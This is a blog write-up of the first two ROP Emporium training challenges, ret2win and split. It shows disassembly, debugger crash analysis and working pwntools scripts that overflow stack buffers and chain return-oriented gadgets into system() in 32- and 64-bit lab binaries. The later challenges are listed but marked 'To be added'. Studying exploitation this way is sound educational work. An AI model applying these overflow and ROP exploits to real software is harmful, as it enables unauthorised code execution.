---
layout: post
title: 	"ROP Emporium: All Challenges (Detailed Explanations)"
date:	2019-07-19 20:52:55 +0800
categories: writeups rop-emporium
---

<div class="toc-container">
  <ul id="markdown-toc">
    <li><a href="#ret2win" id="markdown-toc-h1-header">ret2win</a>
    <ul>
        <li><a href="#32-bit" id="markdown-toc-h3-header">32-bit</a></li>
        <li><a href="#64-bit" id="markdown-toc-h3-header">64-bit</a></li>
    </ul>
    </li>
    <li><a href="#split" id="markdown-toc-h1-header">split</a>
    <ul>
        <li><a href="#32-bit-1" id="markdown-toc-h3-header">32-bit</a></li>
        <li><a href="#64-bit-1" id="markdown-toc-h3-header">64-bit</a></li>
    </ul>
    </li>
    <li><a href="#callme" id="markdown-toc-h1-header">callme</a>
    </li>
    <li><a href="#write4" id="markdown-toc-h1-header">write4</a>
    </li>
    <li><a href="#badchars" id="markdown-toc-h1-header">badchars</a>
    </li>
    <li><a href="#fluff" id="markdown-toc-h1-header">fluff</a>
    </li>
    <li><a href="#pivot" id="markdown-toc-h1-header">pivot</a>
    </li>
    <li><a href="#ret2csu" id="markdown-toc-h1-header">ret2csu</a>
    </li>
  </ul>
</div>

# Introduction

[ROP Emporium](https://ropemporium.com/) is a website that hosts a set of challenges intended to teach Return Oriented Programming, which is a technique used in binary exploitation. This post will showcase my solutions to all the challenges. I will make heavy use of the following tools:

* gdb gef
* pwntools
* ropper
* radare2

The challenges are all listed in sequential order as shown on ROP Emporium's website. It is ordered by increasing difficulty.

Disclaimer: I will make an assumption that anyone reading this is familiar with the basics of binary exploitation, and will skip explaining a lot of the very simple things. You should also know how to read assembly.

# ret2win

This level starts us off with a very simple buffer overflow.

### 32-bit

To start off with, let's run a checksec on the given binary:

```shell
root@kali:~/Documents/ropemporium/ret2win/32ret2win# checksec ./ret2win
[*] '/root/Documents/ropemporium/ret2win/32ret2win/ret2win'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Explanation:

* **Arch: i386-32-little:** This means this is a 32-bit binary compiled on a little-endian system.
* **RELRO: Partial RELRO:** A detailed explanation on what RELRO is can be found [here](https://ctf101.org/binary-exploitation/relocation-read-only/).
* **Stack: No canary found:** Stack canaries are a feature that programs can use to protect against buffer overflows. More information [here](https://ctf101.org/binary-exploitation/stack-canaries/).
* **NX: NX enabled:** NX means Not Executable. This just means that the stack is not executable, meaning we can't just place our own malicious shellcode on the stack and execute it.
* **PIE: No PIE (0x8048000):** PIE means Position Independent Executable. PIE being enabled is synonymous with ASLR being enabled. More information about PIE (and by extension, ASLR) can be found [here](https://ctf101.org/binary-exploitation/address-space-layout-randomization/).

First things first, open the binary up in radare2, analyze it, and see what we can see.
```shell
root@kali:~/Documents/ropemporium/ret2win/32ret2win# r2 ./ret2win 
[0x08048480]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x08048480]> afl
0x080483c0    3 35           sym._init
0x08048400    1 6            sym.imp.printf
0x08048410    1 6            sym.imp.fgets
0x08048420    1 6            sym.imp.puts
0x08048430    1 6            sym.imp.system
0x08048440    1 6            sym.imp.__libc_start_main
0x08048450    1 6            sym.imp.setvbuf
0x08048460    1 6            sym.imp.memset
0x08048470    1 6            sub.__gmon_start_8048470
0x08048480    1 33           entry0
0x080484b0    1 4            sym.__x86.get_pc_thunk.bx
0x080484c0    4 43           sym.deregister_tm_clones
0x080484f0    4 53           sym.register_tm_clones
0x08048530    3 30           sym.__do_global_dtors_aux
0x08048550    4 43   -> 40   entry.init0
0x0804857b    1 123          sym.main
0x080485f6    1 99           sym.pwnme
0x08048659    1 41           sym.ret2win
0x08048690    4 93           sym.__libc_csu_init
0x080486f0    1 2            sym.__libc_csu_fini
0x080486f4    1 20           sym._fini
[0x08048480]> 
```

The important functions are `sym.main`, `sym.pwnme`, and `sym.ret2win`. The important bits of the main function is shown below:
```shell
[0x08048480]> s sym.main
[0x0804857b]> pdf
            ;-- main:
/ (fcn) sym.main 123
|   sym.main (int argc, char **argv, char **envp);
|           ; var int local_4h @ ebp-0x4
|           ; arg int arg_4h @ esp+0x4
|           ; DATA XREF from entry0 (0x8048497)
|           ...
|           0x080485b7      6810870408     push str.ret2win_by_ROP_Emporium ; 0x8048710 ; "ret2win by ROP Emporium"
|           0x080485bc      e85ffeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485c1      83c410         add esp, 0x10
|           0x080485c4      83ec0c         sub esp, 0xc
|           0x080485c7      6828870408     push str.32bits             ; 0x8048728 ; "32bits\n"
|           0x080485cc      e84ffeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485d1      83c410         add esp, 0x10
|           0x080485d4      e81d000000     call sym.pwnme
|           0x080485d9      83ec0c         sub esp, 0xc
|           0x080485dc      6830870408     push str.Exiting            ; 0x8048730 ; "\nExiting"
|           0x080485e1      e83afeffff     call sym.imp.puts           ; int puts(const char *s)
|           ...
[0x0804857b]> 

```

So the main function basically uses `puts()` to output a bunch of text, then calls the `pwnme()` function. Let's see what `pwnme()` does.
```shell
[0x0804857b]> s sym.pwnme
[0x080485f6]> pdf
/ (fcn) sym.pwnme 99
|   sym.pwnme ();
|           ; var int local_28h @ ebp-0x28
|           ; CALL XREF from sym.main (0x80485d4)
|           0x080485f6      55             push ebp
|           0x080485f7      89e5           mov ebp, esp
|           0x080485f9      83ec28         sub esp, 0x28               ; '('
|           0x080485fc      83ec04         sub esp, 4
|           0x080485ff      6a20           push 0x20                   ; 32
|           0x08048601      6a00           push 0
|           0x08048603      8d45d8         lea eax, dword [local_28h]
|           0x08048606      50             push eax
|           0x08048607      e854feffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x0804860c      83c410         add esp, 0x10
|           0x0804860f      83ec0c         sub esp, 0xc
|           0x08048612      683c870408     push str.For_my_first_trick__I_will_attempt_to_fit_50_bytes_of_user_input_into_32_bytes_of_stack_buffer___What_could_possibly_go_wrong ; 0x804873c ; "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?"
|           0x08048617      e804feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0804861c      83c410         add esp, 0x10
|           0x0804861f      83ec0c         sub esp, 0xc
|           0x08048622      68bc870408     push str.You_there_madam__may_I_have_your_input_please__And_don_t_worry_about_null_bytes__we_re_using_fgets ; 0x80487bc ; "You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"
|           0x08048627      e8f4fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0804862c      83c410         add esp, 0x10
|           0x0804862f      83ec0c         sub esp, 0xc
|           0x08048632      6821880408     push 0x8048821
|           0x08048637      e8c4fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0804863c      83c410         add esp, 0x10
|           0x0804863f      a160a00408     mov eax, dword [obj.stdin__GLIBC_2.0] ; [0x804a060:4]=0
|           0x08048644      83ec04         sub esp, 4
|           0x08048647      50             push eax
|           0x08048648      6a32           push 0x32                   ; '2' ; 50
|           0x0804864a      8d45d8         lea eax, dword [local_28h]
|           0x0804864d      50             push eax
|           0x0804864e      e8bdfdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x08048653      83c410         add esp, 0x10
|           0x08048656      90             nop
|           0x08048657      c9             leave
\           0x08048658      c3             ret
[0x080485f6]> 
```

Here is where the buffer overflow lies. We can already see the text says "I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer". The buffer `local_28h` is initialized to a size of 0x20 bytes at instruction `0x08048607`. `fgets()` is then called with a size of 0x32 bytes at instruction `0x0804864e`.

The last function we have to check is `ret2win()`.
```shell
[0x080485f6]> s sym.ret2win
[0x08048659]> pdf
/ (fcn) sym.ret2win 41
|   sym.ret2win ();
|           0x08048659      55             push ebp
|           0x0804865a      89e5           mov ebp, esp
|           0x0804865c      83ec08         sub esp, 8
|           0x0804865f      83ec0c         sub esp, 0xc
|           0x08048662      6824880408     push str.Thank_you__Here_s_your_flag: ; 0x8048824 ; "Thank you! Here's your flag:"
|           0x08048667      e894fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0804866c      83c410         add esp, 0x10
|           0x0804866f      83ec0c         sub esp, 0xc
|           0x08048672      6841880408     push str.bin_cat_flag.txt   ; 0x8048841 ; "/bin/cat flag.txt"
|           0x08048677      e8b4fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0804867c      83c410         add esp, 0x10
|           0x0804867f      90             nop
|           0x08048680      c9             leave
\           0x08048681      c3             ret
[0x08048659]> 
```
It's a tiny function that just calls `system("/bin/cat flag.txt")`. This is the function we want to jump to. Seems easy enough.

Now that we know what to do, let's attempt to crash the program and see exactly where the crash occurs. I like to use gdb gef for this as it has its own built in `pattern create` and `pattern offset` shown below.

```shell
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
[+] Saved as '$_gef0'
gef➤  run
Starting program: /root/Documents/ropemporium/ret2win/32ret2win/ret2win 
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd270  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"
$ebx   : 0x0       
$ecx   : 0xf7fac89c  →  0x00000000
$edx   : 0xffffd270  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"
$esp   : 0xffffd2a0  →  0xf7fe006d  →   add BYTE PTR [esi-0x70], ah
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0xf7fab000  →  0x001d9d6c
$edi   : 0xf7fab000  →  0x001d9d6c
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd2a0│+0x0000: 0xf7fe006d  →   add BYTE PTR [esi-0x70], ah  ← $esp
0xffffd2a4│+0x0004: 0xffffd2c0  →  0x00000001
0xffffd2a8│+0x0008: 0x00000000
0xffffd2ac│+0x000c: 0xf7debb41  →  <__libc_start_main+241> add esp, 0x10
0xffffd2b0│+0x0010: 0xf7fab000  →  0x001d9d6c
0xffffd2b4│+0x0014: 0xf7fab000  →  0x001d9d6c
0xffffd2b8│+0x0018: 0x00000000
0xffffd2bc│+0x001c: 0xf7debb41  →  <__libc_start_main+241> add esp, 0x10
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped, reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset 0x6161616c 50
[+] Searching '0x6161616c'
[+] Found at offset 44 (little-endian search) likely
[+] Found at offset 41 (big-endian search) 
gef➤
```

Quick exploit script written in python.
```python
#!/usr/bin/env python

from pwn import *

context.log_level = 'critical'

elf = ELF("./ret2win")

ret2win_addr = elf.symbols['ret2win']

payload = "A"*40 + "A"*4 # 40 A's for the buffer, 4 A's to overwrite EBP
payload += p32(ret2win_addr) # Overwrite EIP with the address to ret2win()

sh = elf.process()

sh.recvuntil('> ')
sh.sendline(payload)

sh.interactive()
```

And then, the flag.

```shell
root@kali:~/Documents/ropemporium/ret2win/32ret2win# chmod +x exploit.py
root@kali:~/Documents/ropemporium/ret2win/32ret2win# ./exploit.py 
Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
$ 
```

### 64-bit

Running checksec.
```shell
root@kali:~/Documents/ropemporium/ret2win/64ret2win# checksec ./ret2win
[*] '/root/Documents/ropemporium/ret2win/64ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Since this is 64 bit, we will notice something different with the gdb output once we overflow the buffer.
```shell
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
[+] Saved as '$_gef0'
gef➤  run
Starting program: /root/Documents/ropemporium/ret2win/64ret2win/ret2win 
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400810 in pwnme ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe0f0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"
$rbx   : 0x0               
$rcx   : 0xfbad2288        
$rdx   : 0x00007fffffffe0f0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"
$rsp   : 0x00007fffffffe118  →  "faaaaaaag"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x00007ffff7fac8d0  →  0x0000000000000000
$rdi   : 0x00007fffffffe0f1  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"
$rip   : 0x0000000000400810  →  <pwnme+91> ret 
$r8    : 0x0               
$r9    : 0x00007ffff7fb1500  →  0x00007ffff7fb1500  →  [loop detected]
$r10   : 0x0000000000602010  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x0000000000400650  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe200  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe118│+0x0000: "faaaaaaag"  ← $rsp
0x00007fffffffe120│+0x0008: 0x0000000000400067  →   add al, bh
0x00007fffffffe128│+0x0010: 0x00007ffff7e1309b  →  <__libc_start_main+235> mov edi, eax
0x00007fffffffe130│+0x0018: 0x0000000000000000
0x00007fffffffe138│+0x0020: 0x00007fffffffe208  →  0x00007fffffffe4e4  →  "/root/Documents/ropemporium/ret2win/64ret2win/ret2[...]"
0x00007fffffffe140│+0x0028: 0x0000000100000000
0x00007fffffffe148│+0x0030: 0x0000000000400746  →  <main+0> push rbp
0x00007fffffffe150│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400809 <pwnme+84>       call   0x400620 <fgets@plt>
     0x40080e <pwnme+89>       nop    
     0x40080f <pwnme+90>       leave  
 →   0x400810 <pwnme+91>       ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped, reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400810 → pwnme()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset 0x6161616161616165 50
[+] Searching '0x6161616161616165'
[+] Found at offset 32 (little-endian search) likely
[+] Found at offset 25 (big-endian search) 
gef➤ 
```

We see that we don't overwrite RIP at all. This is because we overwrote RIP with an invalid address greater than `0x00007fffffffffff`, which is the maximum address size of a 64 bit system. This causes the OS to raise an exception and thus not update RIP's value at all.

However, we did overwrite RBP, and we know that the RIP exists 8 bytes past RBP's address. Finding the offset for RBP (32) then adding 8 to it, gives us the offset for RIP, which is 32+8=40.

Note that we still have control of RIP, it's just that we can't write an invalid address to it. Fortunately, the address to the `ret2win()` function *is* a valid address, so the following script does the job.

```python
#!/usr/bin/env python

from pwn import *

context.log_level = 'critical'

elf = ELF("./ret2win")

ret2win_addr = elf.symbols['ret2win']

payload = "A"*32 + "A"*8 # 32 A's for the buffer, 8 A's to overwrite RBP
payload += p64(ret2win_addr) # Overwrite RIP with the address to ret2win()

sh = elf.process()

sh.recvuntil('> ')
sh.sendline(payload)

sh.interactive()
```

Easy.
```shell
root@kali:~/Documents/ropemporium/ret2win/64ret2win# chmod +x exploit.py
root@kali:~/Documents/ropemporium/ret2win/64ret2win# ./exploit.py
Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
$ 
```

# split

This level takes it up a notch, and has us set up the stack such that we call `system()` ourselves and supply our own argument of '/bin/cat flag.txt'.

### 32-bit

Running checksec.
```shell
root@kali:~/Documents/ropemporium/split/32split# checksec ./split32
[*] '/root/Documents/ropemporium/split/32split/split32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

Let's pop it through radare2 and see what we can see.
```shell
root@kali:~/Documents/ropemporium/split/32split# r2 ./split32 
[0x08048480]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x08048480]> afl
...
0x0804857b    1 123          sym.main
0x080485f6    1 83           sym.pwnme
0x08048649    1 25           sym.usefulFunction
...
[0x08048480]> 
```

Looking at the important bit, we see three functions now. We can assume `main()` calls `pwnme()` as that's the theme the challenges take. Let's check `pwnme()`.
```shell
[0x08048480]> s sym.pwnme
[0x080485f6]> pdf
/ (fcn) sym.pwnme 83
|   sym.pwnme ();
|           ; var int local_28h @ ebp-0x28
|           ; CALL XREF from sym.main (0x80485d4)
|           0x080485f6      55             push ebp
|           0x080485f7      89e5           mov ebp, esp
|           0x080485f9      83ec28         sub esp, 0x28               ; '('
|           0x080485fc      83ec04         sub esp, 4
|           0x080485ff      6a20           push 0x20                   ; 32
|           0x08048601      6a00           push 0
|           0x08048603      8d45d8         lea eax, dword [local_28h]
|           0x08048606      50             push eax
|           0x08048607      e854feffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x0804860c      83c410         add esp, 0x10
|           0x0804860f      83ec0c         sub esp, 0xc
|           0x08048612      6818870408     push str.Contriving_a_reason_to_ask_user_for_data... ; 0x8048718 ; "Contriving a reason to ask user for data..."
|           0x08048617      e804feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0804861c      83c410         add esp, 0x10
|           0x0804861f      83ec0c         sub esp, 0xc
|           0x08048622      6844870408     push 0x8048744
|           0x08048627      e8d4fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0804862c      83c410         add esp, 0x10
|           0x0804862f      a180a00408     mov eax, dword [obj.stdin__GLIBC_2.0] ; [0x804a080:4]=0
|           0x08048634      83ec04         sub esp, 4
|           0x08048637      50             push eax
|           0x08048638      6a60           push 0x60                   ; '`' ; 96
|           0x0804863a      8d45d8         lea eax, dword [local_28h]
|           0x0804863d      50             push eax
|           0x0804863e      e8cdfdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x08048643      83c410         add esp, 0x10
|           0x08048646      90             nop
|           0x08048647      c9             leave
\           0x08048648      c3             ret
[0x080485f6]> 
```

Instruction `0x08048607` creates a buffer of size 0x20 and stores it in `local_28h`. Instruction `0x0804863e` calls fgets and reads 0x60 characters into `local_28h`. There's our overflow.

Let's take a look at `usefulFunction()`.
```shell
[0x080485f6]> s sym.usefulFunction
[0x08048649]> pdf
/ (fcn) sym.usefulFunction 25
|   sym.usefulFunction ();
|           0x08048649      55             push ebp
|           0x0804864a      89e5           mov ebp, esp
|           0x0804864c      83ec08         sub esp, 8
|           0x0804864f      83ec0c         sub esp, 0xc
|           0x08048652      6847870408     push str.bin_ls             ; 0x8048747 ; "/bin/ls"
|           0x08048657      e8d4fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0804865c      83c410         add esp, 0x10
|           0x0804865f      90             nop
|           0x08048660      c9             leave
\           0x08048661      c3             ret
[0x08048649]> 
```

This calls `system("/bin/ls")`, which is not what we want. We want `system("/bin/cat flag.txt")`. How do we change the argument that `system()` gets called with?

The way we get around this is to call `system()` ourselves. We set up the stack such that EIP jumps to the address to `system()`'s (thus calling it in the process). We want the first argument to be the address of the string "/bin/cat flag.txt". Therefore, we want the stack to look like this:

```
{overwritten_eip_with_addr_to_system}
            ↓
{return_addr_of_system}
            ↓
{first_argument_of_system}
```

So this is what we want to do:

1. Overwrite EIP with the address to `system()`
2. The next four bytes will be the return address of `system()`. This can be gibberish and doesn't matter.
3. The next four bytes must be the address to the string "/bin/cat flag.txt". This is `system()`'s first argument.

I use rabin2 to find addresses of strings, and gdb to find the address of `system@plt`. For more information about how the Global Offset Table (GOT) and the Procedure Linkage Table (PLT) work, see [this](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html).
```shell
root@kali:~/Documents/ropemporium/split/32split# rabin2 -z split32 
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x000006f0 0x080486f0  21  22 (.rodata) ascii split by ROP Emporium
001 0x00000706 0x08048706   7   8 (.rodata) ascii 32bits\n
002 0x0000070e 0x0804870e   8   9 (.rodata) ascii \nExiting
003 0x00000718 0x08048718  43  44 (.rodata) ascii Contriving a reason to ask user for data...
004 0x00000747 0x08048747   7   8 (.rodata) ascii /bin/ls
000 0x00001030 0x0804a030  17  18 (.data) ascii /bin/cat flag.txt
root@kali:~/Documents/ropemporium/split/32split# gdb ./split32 
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 8.2.1 using Python engine 3.7
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./split32...(no debugging symbols found)...done.
gef➤  print 'system@plt'
$1 = {<text variable, no debug info>} 0x8048430 <system@plt>
gef➤  
```
`system@plt is at 0x8048430`

`"/bin/cat flag.txt" is at 0x0804a030`

Writing a simple exploit script with the given information.
```python
#!/usr/bin/env python

from pwn import *

context.log_level = 'critical'
elf = ELF("./split32")

system_addr = p32(0x8048430)
bin_cat_addr = p32(0x0804a030)

payload = "A"*44
payload += system_addr # overwrites EIP
payload += "BBBB" # return address of system()
payload += bin_cat_addr # first argument of system()

sh = elf.process()

sh.recvuntil("> ")
sh.sendline(payload)

sh.interactive()
```

Running the script.
```shell
root@kali:~/Documents/ropemporium/split/32split# chmod +x ./exploit.py
root@kali:~/Documents/ropemporium/split/32split# ./exploit.py 
ROPE{a_placeholder_32byte_flag!}
$ 
```

### 64-bit

The 64-bit version is slightly more difficult because function arguments don't get passed through the stack anymore.

When a function is called, the function's arguments are passed in through 6 registers. The registers are (in order from the 1st to the 6th argument):

1. rdi
2. rsi
3. rdx
4. rcx
5. r8
6. r9

In this case, since we want to call `system()` with the address to the string "/bin/cat flag.txt", we have to first put this address into `rdi` before calling `system()`.

This is where a tool like ropper comes into play. What ropper does is it goes through a binary and finds all occurrences of these bits of assembly called "gadgets". An example of a gadget is `pop rdi; ret;`, which simply pops the top value off the stack into the RDI register, then returns out to the next value on the stack. This is known as a "pop rdi gadget". Another gadget might be a `pop rsi; pop r15; ret;` gadget, which you can return into out of a pop rdi gadget. This would allow you to control up to three arguments to a function!

A pop rdi gadget works well for us since `system()` only requires one argument.. We start out by using ropper to find a pop rdi gadget.

```shell
root@kali:~/Documents/ropemporium/split/64split# ropper -f ./split 
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======

...
...
0x0000000000400883: pop rdi; ret; 
...
...

91 gadgets found
root@kali:~/Documents/ropemporium/split/64split# 
```

`"pop rdi; ret;" at 0x0000000000400883`

Now, this is what we need to do.

1. Overwrite RIP with the address to the pop rdi gadget. 
2. The next 8 bytes must be the address to the string "/bin/cat flag.txt", which will get stored into RDI using the `pop rdi;` statement.
3. The next 8 bytes must be the address to `system()`, which the `ret;` statement will return into.

We don't have to provide a return address for `system()` in this case because we aren't passing arguments through the stack.

Let's not forget to quickly grab the addresses for `system@plt` and the string "/bin/cat flag.txt".
```shell
root@kali:~/Documents/ropemporium/split/64split# rabin2 -z ./split 
[Strings]
Num Paddr      Vaddr      Len Size Section  Type  String
000 0x000008a8 0x004008a8  21  22 (.rodata) ascii split by ROP Emporium
001 0x000008be 0x004008be   7   8 (.rodata) ascii 64bits\n
002 0x000008c6 0x004008c6   8   9 (.rodata) ascii \nExiting
003 0x000008d0 0x004008d0  43  44 (.rodata) ascii Contriving a reason to ask user for data...
004 0x000008ff 0x004008ff   7   8 (.rodata) ascii /bin/ls
000 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt
root@kali:~/Documents/ropemporium/split/64split# gdb ./split 
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 8.2.1 using Python engine 3.7
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./split...(no debugging symbols found)...done.
gef➤  print 'system@plt'
$1 = {<text variable, no debug info>} 0x4005e0 <system@plt>
gef➤  
```

Writing an exploit script.
```python
#!/usr/bin/env python

from pwn import *

context.log_level = 'critical'
elf = ELF("./split")

system_addr = p64(0x4005e0)
bin_cat_addr = p64(0x00601060)
pop_rdi_addr = p64(0x0000000000400883)

payload = "A"*40
payload += pop_rdi_addr # Address to the pop rdi gadget
payload += bin_cat_addr # This address gets popped into rdi
payload += system_addr # The ret will return into this address and execute system()

sh = elf.process()

sh.recvuntil("> ")
sh.sendline(payload)

sh.interactive()
```

Running the exploit.
```shell
root@kali:~/Documents/ropemporium/split/64split# chmod +x ./exploit.py 
root@kali:~/Documents/ropemporium/split/64split# ./exploit.py 
ROPE{a_placeholder_32byte_flag!}
$  
```

# callme

To be added.

# write4

To be added.

# badchars

To be added.

# fluff

To be added.

# pivot

To be added.

# ret2csu

To be added.